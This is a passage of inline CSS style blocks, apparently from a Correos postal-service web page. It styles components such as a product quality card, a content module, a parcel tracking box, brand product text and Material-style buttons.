			.sc-correos-ui-product-quality-card-h[size=md] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop],
			.sc-correos-ui-product-quality-card-h[size=lg] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
				margin-right: 16px;
				margin-bottom: 0
			}

			[size=md].sc-correos-ui-product-quality-card-h .ui-desktop-section.sc-correos-ui-product-quality-card,
			[size=lg].sc-correos-ui-product-quality-card-h .ui-desktop-section.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row;
				margin-top: auto;
				padding-top: 24px
			}

			[size=md].sc-correos-ui-product-quality-card-h .ui-desktop-section__button.sc-correos-ui-product-quality-card,
			[size=lg].sc-correos-ui-product-quality-card-h .ui-desktop-section__button.sc-correos-ui-product-quality-card {
				margin-right: 24px
			}
		}

		@media (min-width: 1024px) {

			[size=md].sc-correos-ui-product-quality-card-h,
			[size=lg].sc-correos-ui-product-quality-card-h {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			.sc-correos-ui-product-quality-card-h[size=md] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop],
			.sc-correos-ui-product-quality-card-h[size=lg] .ui-desktop-container .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
				margin-right: 24px;
				margin-bottom: 0
			}

			[size=md].sc-correos-ui-product-quality-card-h .ui-desktop-section.sc-correos-ui-product-quality-card,
			[size=lg].sc-correos-ui-product-quality-card-h .ui-desktop-section.sc-correos-ui-product-quality-card {
				display: -ms-flexbox;
				display: flex;
				margin-top: auto;
				padding-top: 24px
			}

			[size=md].sc-correos-ui-product-quality-card-h .ui-desktop-section__button.sc-correos-ui-product-quality-card,
			[size=lg].sc-correos-ui-product-quality-card-h .ui-desktop-section__button.sc-correos-ui-product-quality-card {
				margin-right: 24px
			}
		}

		@media (min-width: 640px) {
			[variant=small-img].sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-figure.sc-correos-ui-product-quality-card {
				width: 40px;
				min-width: 40px;
				-ms-flex-align: start;
				align-items: flex-start;
				padding-top: 6px;
				height: auto
			}

			.sc-correos-ui-product-quality-card-h[variant=small-img] .ui-desktop-container .ui-desktop-figure .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
				width: 40px;
				height: auto
			}
		}

		@media (min-width: 1024px) {
			[variant=small-img].sc-correos-ui-product-quality-card-h .ui-desktop-container.sc-correos-ui-product-quality-card .ui-desktop-figure.sc-correos-ui-product-quality-card {
				width: 40px;
				min-width: 40px;
				-ms-flex-align: start;
				align-items: flex-start;
				padding-top: 8px;
				height: auto
			}

			.sc-correos-ui-product-quality-card-h[variant=small-img] .ui-desktop-container .ui-desktop-figure .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
				width: 40px;
				height: auto
			}
		}

		.sc-correos-ui-product-quality-card-h[variant=small-img] .sc-correos-ui-product-quality-card-s>[slot=image-mobile] {
			width: 24px;
			height: 24px;
			margin-right: 16px
		}

		.sc-correos-ui-product-quality-card-h[variant=small-img] .sc-correos-ui-product-quality-card-s>[slot=title-mobile],
		.sc-correos-ui-product-quality-card-h[variant=small-img] .sc-correos-ui-product-quality-card-s>[slot=title-desktop] {
			font-weight: 500
		}

		.sc-correos-ui-product-quality-card-h[variant=small-img] .sc-correos-ui-product-quality-card-s>[slot=body-text-desktop] {
			font-weight: 300
		}

		.sc-correos-ui-product-quality-card-h[variant=small-img] .sc-correos-ui-product-quality-card-s>[slot=image-desktop] {
			height: auto
		}

		.sc-correos-ui-product-quality-card-h[variant=small-img] .sc-correos-ui-product-quality-card-s>[slot=title-mobile] {
			margin-bottom: 0
		}
	</style>
	<style>
		.sc-correos-ui-content-module-h {
			--_ui-content-module-color-bg: var(--ui-content-module-color, teal);
			--_ui-content-module-box-shadow: var(--ui-content-module-box-shadow, 0 30px 20px 0 rgba(0, 0, 0, 0.1));
			--_ui-content-module-color-title: var(--ui-content-module-color-title, pink);
			--_ui-content-module-color-border: 1px solid var(--ui-content-module-color-border, yellow);
			--_ui-content-module-border-container: var(--ui-content-module-border-container, 0)
		}

		.sc-correos-ui-content-module-h {
			background: var(--_ui-content-module-color-bg);
			-webkit-box-shadow: var(--_ui-content-module-box-shadow);
			box-shadow: var(--_ui-content-module-box-shadow);
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			border: var(--_ui-content-module-color-border);
			border-radius: var(--_ui-content-module-border-container);
			overflow: hidden
		}

		.sc-correos-ui-content-module-h .ui-figure.sc-correos-ui-content-module {
			margin: 0;
			padding: 0;
			border: 0;
			font-size: 100%;
			font: inherit;
			vertical-align: baseline;
			height: 176px
		}

		@media (min-width: 640px) {
			.sc-correos-ui-content-module-h .ui-figure.sc-correos-ui-content-module {
				height: 224px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-content-module-h .ui-figure.sc-correos-ui-content-module {
				height: 224px
			}
		}

		.sc-correos-ui-content-module-h .ui-description.sc-correos-ui-content-module {
			padding: 16px;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			height: 100%
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-content-module-h .ui-description.sc-correos-ui-content-module {
				padding: 24px
			}
		}

		.sc-correos-ui-content-module-h .sc-correos-ui-content-module-s>[slot=title] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_ui-content-module-color-title);
			font-size: 1.5rem;
			line-height: 2.25rem;
			margin-bottom: 8px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-content-module-h .sc-correos-ui-content-module-s>[slot=title] {
				font-size: 2rem;
				line-height: 2.75rem
			}
		}

		.sc-correos-ui-content-module-h .sc-correos-ui-content-module-s>[slot=paragraph] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_ui-content-module-color-text);
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: 300;
			margin-bottom: 29px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-content-module-h .sc-correos-ui-content-module-s>[slot=paragraph] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-content-module-h .sc-correos-ui-content-module-s>[slot=link] {
			margin-top: auto
		}

		.sc-correos-ui-content-module-s>[slot=img-header] {
			width: 100%;
			height: 100%;
			-o-object-fit: cover;
			object-fit: cover
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-cdk-tracking-box-h {
			--_cdk-tracking-box-background-color: var(--correos-cdk-tracking-box-color-bg, white);
			--_cdk-tracking-box-box-shadow: var(--correos-cdk-tracking-box-box-shadow, 0 10px 20px 0 red);
			--_cdk-tracking-box-color-title: var(--correos-cdk-tracking-box-color-title, pink);
			--_cdk-tracking-box-color-text: var(--correos-cdk-tracking-box-color-help-text, blue);
			--_cdk-tracking-box-color-text-download: var(--cdk-tracking-box-color-text-download, blue)
		}

		.sc-correos-cdk-tracking-box-h {
			display: block
		}

		.sc-correos-cdk-tracking-box-h .cdk-notification.sc-correos-cdk-tracking-box {
			width: 100%;
			margin-bottom: 16px
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-tracking-box-h .cdk-notification.sc-correos-cdk-tracking-box {
				width: 80%
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-tracking-box-h .cdk-notification.sc-correos-cdk-tracking-box {
				margin-bottom: 24px
			}
		}

		.sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box {
			padding: 16px 24px 16px 16px;
			border-radius: 8px;
			background-color: var(--_cdk-tracking-box-background-color);
			-webkit-box-shadow: var(--_cdk-tracking-box-box-shadow);
			box-shadow: var(--_cdk-tracking-box-box-shadow)
		}

		.sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-fieldset.sc-correos-cdk-tracking-box {
			border: 0;
			padding: 0;
			margin: 0;
			min-width: 0;
			-ms-flex: 1 1 auto;
			flex: 1 1 auto
		}

		.sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-container.sc-correos-cdk-tracking-box {
			width: 100%
		}

		.sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-container-form.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			width: 100%
		}

		.sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			margin-left: 8px
		}

		.sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-help-text-container.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			margin-top: 16px
		}

		.sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-location.sc-correos-cdk-tracking-box {
			margin-top: -40px;
			text-align: right
		}

		.sc-correos-cdk-tracking-box-h .sc-correos-cdk-tracking-box-s>[slot=title] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			margin-bottom: 8px;
			font-size: 1.125rem;
			line-height: 1.625rem;
			color: var(--_cdk-tracking-box-color-title)
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-tracking-box-h .sc-correos-cdk-tracking-box-s>[slot=title] {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-cdk-tracking-box-h .sc-correos-cdk-tracking-box-s>[slot=help-text] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: initial;
			text-decoration: none;
			font-size: 0.875rem;
			line-height: 1.375rem;
			color: var(--_cdk-tracking-box-color-text);
			text-decoration: underline
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-tracking-box-h .sc-correos-cdk-tracking-box-s>[slot=help-text] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-cdk-tracking-box-h .sc-correos-cdk-tracking-box-s>[slot=icon-right] {
			margin-left: 8px;
			z-index: 3
		}

		[size=sm].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		[size=sm].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			width: 30%;
			margin-left: 16px
		}

		[size=md].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=md].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			width: 21%;
			margin-left: 16px
		}

		[size=lg].sc-correos-cdk-tracking-box-h .cdk-form-container.sc-correos-cdk-tracking-box {
			margin-bottom: 0
		}

		[size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box>*.sc-correos-cdk-tracking-box {
			margin-right: 40px
		}

		[size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box>*.sc-correos-cdk-tracking-box:last-child {
			margin-right: unset
		}

		[size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			width: 20%;
			margin-left: 24px
		}

		[size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-location.sc-correos-cdk-tracking-box {
			right: 29px;
			top: 154px
		}

		[variant=download].sc-correos-cdk-tracking-box-h .cdk-fieldset__text-download.sc-correos-cdk-tracking-box {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			color: var(--_cdk-tracking-box-color-text-download);
			margin: 16px 0
		}

		@media (min-width: 1024px) {
			[variant=download].sc-correos-cdk-tracking-box-h .cdk-fieldset__text-download.sc-correos-cdk-tracking-box {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		[variant=download].sc-correos-cdk-tracking-box-h .cdk-container-form.sc-correos-cdk-tracking-box {
			-ms-flex-direction: column;
			flex-direction: column
		}

		[variant=download].sc-correos-cdk-tracking-box-h .cdk-button.sc-correos-cdk-tracking-box {
			margin-left: 0 !important;
			margin-top: 16px
		}

		[variant=download].sc-correos-cdk-tracking-box-h .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 16px
		}

		[variant=download][size=lg].sc-correos-cdk-tracking-box-h .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 24px
		}

		[variant=download][size=lg].sc-correos-cdk-tracking-box-h .cdk-button.sc-correos-cdk-tracking-box {
			margin-top: 24px
		}

		[variant=gnomo].sc-correos-cdk-tracking-box-h .cdk-fieldset__text-download.sc-correos-cdk-tracking-box {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			color: var(--_cdk-tracking-box-color-text-download);
			margin: 16px 0
		}

		@media (min-width: 1024px) {
			[variant=gnomo].sc-correos-cdk-tracking-box-h .cdk-fieldset__text-download.sc-correos-cdk-tracking-box {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		[variant=gnomo].sc-correos-cdk-tracking-box-h .cdk-fieldset__gonomo-input.sc-correos-cdk-tracking-box {
			margin-bottom: 24px
		}

		[variant=gnomo].sc-correos-cdk-tracking-box-h .cdk-container-form.sc-correos-cdk-tracking-box {
			-ms-flex-direction: column;
			flex-direction: column
		}

		[variant=gnomo].sc-correos-cdk-tracking-box-h .cdk-button.sc-correos-cdk-tracking-box {
			margin-left: 0 !important;
			margin-top: 16px
		}

		[variant=gnomo].sc-correos-cdk-tracking-box-h .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 16px
		}

		[variant=gnomo].sc-correos-cdk-tracking-box-h .cdk-checkbox.sc-correos-cdk-tracking-box {
			margin-top: 24px
		}

		[variant=gnomo][size=lg].sc-correos-cdk-tracking-box-h .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 24px
		}

		[variant=gnomo][size=lg].sc-correos-cdk-tracking-box-h .cdk-button.sc-correos-cdk-tracking-box {
			margin-top: 24px
		}

		[variant=download-a].sc-correos-cdk-tracking-box-h .cdk-container-form.sc-correos-cdk-tracking-box {
			-ms-flex-direction: column;
			flex-direction: column
		}

		[variant=download-a].sc-correos-cdk-tracking-box-h .cdk-button.sc-correos-cdk-tracking-box {
			margin-left: 0 !important;
			margin-top: 16px
		}

		[variant=download-a].sc-correos-cdk-tracking-box-h .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 16px
		}

		[variant=download-a][size=lg].sc-correos-cdk-tracking-box-h .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 24px
		}

		[variant=download-a][size=lg].sc-correos-cdk-tracking-box-h .cdk-button.sc-correos-cdk-tracking-box {
			margin-top: 24px
		}

		[variant=with-tools].sc-correos-cdk-tracking-box-h .cdk-tools.sc-correos-cdk-tracking-box {
			width: 100%;
			margin-top: 16px;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools] .sc-correos-cdk-tracking-box-s>[slot^=tool-] {
			margin-bottom: 8px;
			width: 100%
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools] .sc-correos-cdk-tracking-box-s>[slot^=tool-]:last-child {
			margin-right: unset;
			margin-bottom: 8px
		}

		[variant=with-tools][size=sm].sc-correos-cdk-tracking-box-h .cdk-tools.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row;
			margin-top: 16px
		}

		[variant=with-tools][size=sm].sc-correos-cdk-tracking-box-h .cdk-button.sc-correos-cdk-tracking-box {
			width: 27%
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools][size=sm] .sc-correos-cdk-tracking-box-s>[slot^=tool-] {
			width: 100%;
			margin-right: 13px;
			margin-bottom: 0
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools][size=sm] .sc-correos-cdk-tracking-box-s>[slot^=tool-]:last-child {
			margin-right: unset;
			margin-bottom: 0
		}

		[variant=with-tools][size=md].sc-correos-cdk-tracking-box-h .cdk-tools.sc-correos-cdk-tracking-box {
			-ms-flex-direction: column;
			flex-direction: column;
			margin-top: 16px;
			margin-left: 32px;
			-ms-flex-align: start;
			align-items: flex-start
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools][size=md] .sc-correos-cdk-tracking-box-s>[slot^=tool-] {
			width: 100%;
			margin-right: 16px;
			margin-bottom: 8px
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools][size=md] .sc-correos-cdk-tracking-box-s>[slot^=tool-]:last-child {
			margin-right: unset;
			margin-bottom: 0
		}

		[variant=with-tools][size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			width: 30%
		}

		[variant=with-tools][size=lg].sc-correos-cdk-tracking-box-h .cdk-tools.sc-correos-cdk-tracking-box {
			margin-top: 11px;
			margin-left: auto;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools][size=lg] .sc-correos-cdk-tracking-box-s>[slot^=tool-] {
			width: 100%;
			margin-right: 16px;
			margin-bottom: 0
		}

		.sc-correos-cdk-tracking-box-h[variant=with-tools][size=lg] .sc-correos-cdk-tracking-box-s>[slot^=tool-]:last-child {
			margin-right: unset;
			margin-bottom: 0
		}

		[variant=landing].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		[variant=landing].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-tools.sc-correos-cdk-tracking-box {
			margin-top: 16px
		}

		[variant=landing].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			width: 27%
		}

		[variant=landing].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-help-text-container.sc-correos-cdk-tracking-box {
			margin-top: 7px;
			margin-bottom: 40px
		}

		.sc-correos-cdk-tracking-box-h[variant=landing] .cdk-tracking-box .sc-correos-cdk-tracking-box-s>[slot^=tool-] {
			width: 100%;
			margin-bottom: 15px
		}

		.sc-correos-cdk-tracking-box-h[variant=landing] .cdk-tracking-box .sc-correos-cdk-tracking-box-s>[slot^=tool-]:last-child {
			margin-bottom: 0
		}

		.sc-correos-cdk-tracking-box-h[variant=landing] .cdk-tracking-box .sc-correos-cdk-tracking-box-s>[slot=help-text] {
			text-decoration: none
		}

		[variant=module].sc-correos-cdk-tracking-box-h .cdk-container-form.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		[variant=module].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-container-form.sc-correos-cdk-tracking-box {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		[variant=module].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 16px
		}

		[variant=module].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			margin-left: 0;
			margin-top: 16px
		}

		[variant=module][size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-select.sc-correos-cdk-tracking-box {
			margin-bottom: 24px
		}

		[variant=module][size=lg].sc-correos-cdk-tracking-box-h .cdk-tracking-box.sc-correos-cdk-tracking-box .cdk-button.sc-correos-cdk-tracking-box {
			margin-top: 24px
		}
	</style>
	<style>
		.sc-correos-ui-brand-product-text-h {
			--_cdk-brand-product-text-color-title: var(--cdk-brand-product-text-color-title, red);
			--_cdk-brand-product-text-color-subtitle: var(--cdk-brand-product-text-color-subtitle, blue);
			--_cdk-brand-product-text-color-body-text: var(--cdk-brand-product-text-color-body-text, magenta)
		}

		.sc-correos-ui-brand-product-text-h {
			display: block
		}

		.sc-correos-ui-brand-product-text-h .ui-container.sc-correos-ui-brand-product-text {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		.sc-correos-ui-brand-product-text-h .ui-section.sc-correos-ui-brand-product-text {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=title] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.75rem;
			line-height: 1.175rem;
			color: var(--_cdk-brand-product-text-color-title);
			font-weight: bold;
			margin-bottom: 8px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=title] {
				font-size: 0.875rem;
				line-height: 1.25rem
			}
		}

		.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=subtitle] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 1.5rem;
			line-height: 2.25rem;
			color: var(--_cdk-brand-product-text-color-subtitle);
			font-weight: 300
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=subtitle] {
				font-size: 2rem;
				line-height: 2.75rem
			}
		}

		.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=body-text] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_cdk-brand-product-text-color-body-text);
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: 300;
			margin-top: 8px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=body-text] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=link]:empty {
			display: none
		}

		.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=link] {
			margin-top: 16px;
			margin-left: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=link] {
				margin-left: 24px
			}
		}

		.sc-correos-ui-brand-product-text-h .sc-correos-ui-brand-product-text-s>[slot=button] {
			margin-top: 16px;
			margin-right: 16px
		}

		[size=sm].sc-correos-ui-brand-product-text-h .ui-section.sc-correos-ui-brand-product-text,
		[size=md].sc-correos-ui-brand-product-text-h .ui-section.sc-correos-ui-brand-product-text,
		[size=lg].sc-correos-ui-brand-product-text-h .ui-section.sc-correos-ui-brand-product-text {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row;
			padding-top: 16px
		}

		.sc-correos-ui-brand-product-text-h[size=sm] .sc-correos-ui-brand-product-text-s>[slot=button],
		.sc-correos-ui-brand-product-text-h[size=md] .sc-correos-ui-brand-product-text-s>[slot=button],
		.sc-correos-ui-brand-product-text-h[size=lg] .sc-correos-ui-brand-product-text-s>[slot=button] {
			margin-right: 24px
		}
	</style>
	<style>
		@charset "UTF-8";

		.mdc-touch-target-wrapper.sc-correos-ui-card {
			display: inline
		}

		.mdc-button.sc-correos-ui-card {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 0.875rem;
			line-height: 2.25rem;
			font-weight: 500;
			letter-spacing: 0.0892857143em;
			text-decoration: none;
			text-transform: uppercase;
			padding: 0 8px 0 8px;
			display: -ms-inline-flexbox;
			display: inline-flex;
			position: relative;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: center;
			justify-content: center;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			min-width: 64px;
			border: none;
			outline: none;
			line-height: inherit;
			-webkit-user-select: none;
			-moz-user-select: none;
			-ms-user-select: none;
			user-select: none;
			-webkit-appearance: none;
			overflow: visible;
			vertical-align: middle;
			border-radius: 4px
		}

		.mdc-button.sc-correos-ui-card::-moz-focus-inner {
			padding: 0;
			border: 0
		}

		.mdc-button.sc-correos-ui-card:active {
			outline: none
		}

		.mdc-button.sc-correos-ui-card:hover {
			cursor: pointer
		}

		.mdc-button.sc-correos-ui-card:disabled {
			background-color: transparent;
			color: rgba(0, 0, 0, 0.37);
			cursor: default;
			pointer-events: none
		}

		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card {
			border-radius: 4px
		}

		.mdc-button.sc-correos-ui-card:not(:disabled) {
			background-color: transparent
		}

		.mdc-button.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card {
			margin-left: 0;
			margin-right: 8px;
			display: inline-block;
			width: 18px;
			height: 18px;
			font-size: 18px;
			vertical-align: top
		}

		[dir=rtl].sc-correos-ui-card .mdc-button.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card,
		.mdc-button.sc-correos-ui-card .mdc-button__icon[dir=rtl].sc-correos-ui-card {
			margin-left: 8px;
			margin-right: 0
		}

		.mdc-button.sc-correos-ui-card .mdc-button__touch.sc-correos-ui-card {
			position: absolute;
			top: 50%;
			right: 0;
			left: 0;
			height: 48px;
			-webkit-transform: translateY(-50%);
			transform: translateY(-50%)
		}

		.mdc-button.sc-correos-ui-card:not(:disabled) {
			color: #6200ee;
			color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card {
			margin-left: 8px;
			margin-right: 0
		}

		[dir=rtl].sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card,
		.mdc-button__label.sc-correos-ui-card+.mdc-button__icon[dir=rtl].sc-correos-ui-card {
			margin-left: 0;
			margin-right: 8px
		}

		svg.mdc-button__icon.sc-correos-ui-card {
			fill: currentColor
		}

		.mdc-button--raised.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card,
		.mdc-button--unelevated.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card,
		.mdc-button--outlined.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card {
			margin-left: -4px;
			margin-right: 8px
		}

		[dir=rtl].sc-correos-ui-card .mdc-button--raised.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card,
		.mdc-button--raised.sc-correos-ui-card .mdc-button__icon[dir=rtl].sc-correos-ui-card,
		[dir=rtl].sc-correos-ui-card .mdc-button--unelevated.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card,
		.mdc-button--unelevated.sc-correos-ui-card .mdc-button__icon[dir=rtl].sc-correos-ui-card,
		[dir=rtl].sc-correos-ui-card .mdc-button--outlined.sc-correos-ui-card .mdc-button__icon.sc-correos-ui-card,
		.mdc-button--outlined.sc-correos-ui-card .mdc-button__icon[dir=rtl].sc-correos-ui-card {
			margin-left: 8px;
			margin-right: -4px
		}

		.mdc-button--raised.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card,
		.mdc-button--unelevated.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card,
		.mdc-button--outlined.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card {
			margin-left: 8px;
			margin-right: -4px
		}

		[dir=rtl].sc-correos-ui-card .mdc-button--raised.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card,
		.mdc-button--raised.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon[dir=rtl].sc-correos-ui-card,
		[dir=rtl].sc-correos-ui-card .mdc-button--unelevated.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card,
		.mdc-button--unelevated.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon[dir=rtl].sc-correos-ui-card,
		[dir=rtl].sc-correos-ui-card .mdc-button--outlined.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon.sc-correos-ui-card,
		.mdc-button--outlined.sc-correos-ui-card .mdc-button__label.sc-correos-ui-card+.mdc-button__icon[dir=rtl].sc-correos-ui-card {
			margin-left: -4px;
			margin-right: 8px
		}

		.mdc-button--raised.sc-correos-ui-card,
		.mdc-button--unelevated.sc-correos-ui-card {
			padding: 0 16px 0 16px
		}

		.mdc-button--raised.sc-correos-ui-card:disabled,
		.mdc-button--unelevated.sc-correos-ui-card:disabled {
			background-color: rgba(0, 0, 0, 0.12);
			color: rgba(0, 0, 0, 0.37)
		}

		.mdc-button--raised.sc-correos-ui-card:not(:disabled),
		.mdc-button--unelevated.sc-correos-ui-card:not(:disabled) {
			background-color: #6200ee
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button--raised.sc-correos-ui-card:not(:disabled),
